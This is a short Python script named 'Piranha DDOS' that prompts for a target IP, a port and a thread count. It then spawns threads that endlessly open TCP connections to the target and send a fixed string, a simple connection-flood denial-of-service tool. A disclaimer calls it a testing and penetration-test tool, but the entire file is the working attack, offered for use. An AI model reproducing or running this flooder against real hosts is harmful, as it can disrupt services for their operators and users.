import socket 
import threading
import time

print("Piranha DDOS")
print("Note: This DDOS tool is created for testing purpose and Penetration Test only, using it for any illegal activites is strictly prohibited and the creator is not to be asked")
time.sleep(4)

TARGET = input("Target IP: ")
TARGET_PORT = int(input("Target PORT: "))
THREADS = int(input("Number of threads: "))

def attacker():
    while True:
      CONNECT_SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      CONNECT_SOCKET.connect((TARGET, TARGET_PORT))
      CONNECT_SOCKET.send("HELLO MR SERVER".encode())
      print(f"Sending thread: {threads}")

for threads in range(THREADS):
    thread = threading.Thread(target=attacker)
    thread.start()
